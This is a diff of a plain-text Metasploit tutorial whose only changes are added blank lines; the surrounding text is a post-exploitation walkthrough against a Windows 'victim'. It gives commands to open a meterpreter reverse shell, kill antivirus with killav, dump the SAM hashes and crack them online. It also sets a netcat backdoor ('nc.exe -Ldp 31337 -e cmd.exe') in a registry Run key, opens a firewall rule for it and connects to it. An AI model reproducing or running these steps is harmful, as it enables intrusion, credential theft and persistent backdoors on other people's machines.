@@ -755,6 +755,7 @@ but I will not cover them all here. If you want to learn more about it then use 
 		i.	…this number must match the session Id from the previous exploit!!!!
 	c.	Type run or exploit -j
 		i.	…you will get a new meterpreter reverse shell
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: If you get a UAC Disabled error then that means that the security setting in the Action Center is set to OFF. This is not
 good for any user as anything will install without them knowing. Also this is not the default security setting for it.
@@ -802,6 +803,7 @@ These steps are a continuation from step #12. They can also be used in XP and it
 	b.	Type getprivs
 		i.	…lists the process privileges
 	c.	Type killav
+
 		i.	…kills all Antivirus services running
 -------------------------------------------------------------------------------------------------------------------------------
 Note: We can also use the incognito command along with its options and steal tokens to get System level rights… Google what
@@ -816,6 +818,7 @@ folder therefore when I upload this file it will go to that folder…
 	c.	Type shell then cd c:\users\<username>\downloads
 		i.	…username will be the current user you’re using
 	d.	Type dir to see the contents of the folder
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: If you misplace an uploaded file use the where command in Windows shell to find its location
 -------------------------------------------------------------------------------------------------------------------------------
@@ -842,6 +845,7 @@ Note: If you misplace an uploaded file use the where command in Windows shell to
 
 24.	Type exit to exit the Windows shell
 		i.	…you’re back in meterpreter
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this sentence
 made sense to you?!
@@ -862,6 +866,7 @@ made sense to you?!
 27.	Use cat to view the files
 	a.	Type cat list.txt
 	b.	Type cat curr_user.txt
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: I tried writing a small BASH script and found out that using a text editor like nano from within msfconsole will crash/freeze
 the session even if you put it in the background. If this happens to you don’t forget to check how many sessions you have running
@@ -873,6 +878,7 @@ when you return to what you were doing; also kill any unused sessions that may b
 		i.	…you now have the SAM file with users and keys
 		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems
 		in the wild unless you count ATM machines; the second part you can use against a rainbow table in a program or an online rainbow table website
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google what they mean.
 -------------------------------------------------------------------------------------------------------------------------------
@@ -882,6 +888,7 @@ Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google 
 	b.	Use Ctrl+C to paste the hash in it
 	c.	Scroll down and enter the CAPTCHA then hit the submit button
 	d.	Scroll up and verify your hash was found…it will also give you the password on the right side box
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: XP uses NT, Windows 7 and later uses NTLM
 -------------------------------------------------------------------------------------------------------------------------------
@@ -905,6 +912,7 @@ Note: XP uses NT, Windows 7 and later uses NTLM
 		i.	…adds a registry key so netcat boots up every time the systems is turned on…
 	c.	Type reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc –d ’C:\Windows\system32\nc.exe –Ldp 31337 –e cmd.exe’
 		i.	…adds another registry letting the value know where nc.exe is located, the port to open and what to run once it connects
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Optional: Type reg queryval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc …if you want to confirm the parameters are correct
 Also optional, you can do a port scan (nmap –sS <victim_ip_address> -vv ) to check the ports
@@ -921,6 +929,7 @@ Also optional, you can do a port scan (nmap –sS <victim_ip_address> -vv ) to c
 		i.	…adds the rule
 	e.	Type netsh advfirewall firewall show rule netcat
 		i.	…to confirm
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: If you’re victim is tech-savvy and has a sandbox program protecting c:\ then uploading may not work
 -------------------------------------------------------------------------------------------------------------------------------
@@ -941,6 +950,7 @@ Note: If you’re victim is tech-savvy and has a sandbox program protecting c:\ 
 38.	In Kali…
 	a.	Type nc –v <victim_ip_address> 445
 		i.	…you will have to wait for it to connect
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: You can also use telnet…type telnet <victim_ip_address> port
 -------------------------------------------------------------------------------------------------------------------------------
